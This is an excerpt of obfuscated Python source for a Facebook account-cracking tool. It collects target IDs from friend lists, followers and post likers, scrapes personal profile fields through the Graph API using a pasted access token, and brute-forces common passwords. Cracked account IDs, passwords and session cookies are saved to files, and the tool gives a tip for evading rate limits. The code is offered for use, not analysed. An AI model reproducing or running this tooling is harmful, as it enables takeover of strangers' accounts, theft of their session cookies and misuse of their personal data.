...
_logo_line_3_ = ('%s███████║██║░░░░░██║%s│   %s• ALI RAZA•   %s│'%(_P_,_U_,_P_,_U_))
_logo_line_4_ = ('%s██║░░██║███████╗██║%s│ %s03047269778 %s│'%(_P_,_U_,_P_,_U_))
_logo_line_5_ = ('%s╚═╝░░╚═╝╚══════╝╚═╝%s└─────────────────────────┘'%(_U_))
def _my_logo_():
...
def _login_dev_(_Cici_Cantik_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Cici_Cantik_Banget_:_dapunta_cici_('%s[%s!%s] %sHello And Welcome?'%(_M_,_P_,_M_,_P_))
    else:pass
    _tok_dev_ = _cici_dapunta_('%s[%s•%s] %sPaste Token :\n\n'%(_U_,_P_,_U_,_P_))
    try:
        ...
        _dapunta_cici_('\n%s[%s!%s] %sInternet issue'%(_M_,_P_,_M_,_P_))
        _cici_cici_()
...
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Dapunta_Ganteng_Banget_:_dapunta_cici_('%s[%s!%s] %sHello And Welcome?'%(_M_,_P_,_M_,_P_))
    else:pass
    try:
    ...
    try:
        ...
        _tanggal_ = ' '
    _dapunta_cici_('%s[%s•%s] %sHelloo %s%s'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_))
    _dapunta_cici_('%s[%s•%s] %sID : %s'%(_U_,_P_,_U_,_P_,_id_dev_))
    _dapunta_cici_('%s[%s•%s] %sIP : %s'%(_U_,_P_,_U_,_P_,_ip_dev_))
    _dapunta_cici_('%s[%s•%s] %sDate : %s\n'%(_U_,_P_,_U_,_P_,_tanggal_))
    _dapunta_cici_('%s[%s1%s] %sCrack From Public Account'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCrack From Followers'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s3%s] %sCrack From Post Likes'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s4%s] %sCheck Crack List'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s0%s] %sLog Out'%(_U_,_P_,_U_,_P_))
    _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sselect : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        _dapunta_cici_('%s[%s!%s] %sCorrect'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        ...
        _dapunta_cici_('%s[%s•%s] %sSee you later %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    else:
...
def _publik_dev_(_tok_dev_):
    ...
    _dapunta_cici_('%s[%s•%s] %sWrite \'me\' For Own Frienlist Crack'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sinput ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
    ...
    try:
        ...
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / Account Not Found'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
...
def _followers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sWrite \'me\' For Own Friendlist Cracking'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sInput ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
...
def _likers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sWrite \'me\' For Own Friendlist Cracking'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sInput Target Id: %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
...
def log_api(_dapunta_,_cici_,_ratya_):
    ...
    if 'session_key' in _response_dev_.text and 'EAA' in _response_dev_.text:
...
class _crack_dev_:
    def __init__(self,_files_dapunta_):
        ...
        _dapunta_cici_('\n%s[%s•%s] %sChoose Password Method Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
        while True:
            _pilih_pass_ = _cici_dapunta_('%s[%s•%s] %sinput : '%(_U_,_P_,_U_,_P_))
            if _pilih_pass_=="":
                _dapunta_cici_('%s[%s!%s] %sCorrect'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                ...
                try:
                    while True:
                        try:
                            ...
                            _dapunta_cici_('%s[%s!%s] %sFile Not Found'%(_M_,_P_,_M_,_P_))
                            time.sleep(2)
                            _menu_dev_(self._Dapunta_Sayang_Cici_)
                    self._files_crack_ = []
                    ...
                    time.sleep(2)
                    _menu_dev_(self._Dapunta_Sayang_Cici_)
                _dapunta_cici_('%s[%s•%s] %sExample : Pakistan,786786,123456'%(_U_,_P_,_U_,_P_))
                self.pwlist()
                break
                ...
                try:
                    ...
                    start_method()
                    put = _cici_dapunta_('%s[%s•%s] %sInput : '%(_U_,_P_,_U_,_P_))
                    _dapunta_cici_(''%())
                    if put in ['']:
                        _dapunta_cici_('%s[%s!%s] %sCorrect'%(_M_,_P_,_M_,_P_))
                        time.sleep(2)
            ...
            for _suci_salsabila_ in _files_crack_.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sAli/CP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                    ...
                    _dapunta_cici_("\r%s[%sAli/CP%s] %s • %s                 "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_))
                    ...
                    _dapunta_cici_("\r%s[%sAli/OK%s] %s • %s • %s     "%(_H_,_P_,_H_,_files_crack_.get("id"),_suci_salsabila_,log.get("cookies")))
        ...
        try:
            for _suci_salsabila_ in _files_crack_.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    _dapunta_cici_("\r%s[%sAli/OK%s] %s • %s • %s     "%(_H_,_P_,_H_,_files_crack_.get("id"),_suci_salsabila_,koki(log.get("cookies"))))
                    self._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                    _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                    break
                else:continue
...
def _cek_result_dev_():
    ...
    _my_logo_()
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[ %sTotal Crack %s]'%(_U_,_P_,_U_))
    _dapunta_cici_('\n%s[%s1%s] %sCheck OK List'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCheck CP List'%(_U_,_P_,_U_,_P_))
    ...
    if ch in ['']:
        ...
        try:
            ...
            _dapunta_cici_('')
            files = _cici_dapunta_('%s[%s•%s] %sPut File : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_('')
            if files == "":
                _dapunta_cici_('%s[%s!%s] %sCorrect'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
        ...
        try:
            ...
            for file in cpl:
                _dapunta_cici_('%s[%s•%s] %s%s'%(_U_,_P_,_U_,_P_,file))
            _dapunta_cici_('')
            files = _cici_dapunta_('%s[%s•%s] %sInput File : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_('')
            if files == "":
                _dapunta_cici_('%s[%s!%s] %sCorrect'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
            ...
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            _dapunta_cici_('\n%s[%s•%s] %sTotal Crack Result Date %s ls %s Account'%(_U_,_P_,_U_,_P_,del1,len(ppp)))
        except:
            _dapunta_cici_('%s[%sNo Results Found %s]'%(_M_,_P_,_M_))
    else:
        _dapunta_cici_('%s[%s!%s] %sCorrect'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
...
def _ugen_dev_(_Dapunta_Sayang_Cici_):
    ...
    if pmu in[""]:
        ...
        _del_()
        ua = _cici_dapunta_("%s[%s•%s] %sInput User Agent : \n\n"%(_U_,_P_,_U_,_P_))
        try:
            ugent = _dapunta_dapunta_('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            _dapunta_cici_("\n%s[ %sFailed to Change User Agent %s]"%(_U_,_P_,_U_))
            _cici_dapunta_('\n%s[ %sReturn %s]%s'%(_U_,_P_,_U_,_P_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
        except (KeyError,IOError):
...
def _var_ugen_(_Dapunta_Cinta_Cici_):
    ...
    _dapunta_cici_("%s[%s3%s] %sChange User Agent %s[%sCustomize HP%s]"%(_U_,_P_,_U_,_P_,_U_,_P_,_U_))
...
def started():
    _dapunta_cici_('%s[%s•%s] %sCrack is Running...'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sEnable Airplane Mode [5 Sec] After Every 5 Minutes\n'%(_U_,_P_,_U_,_P_))
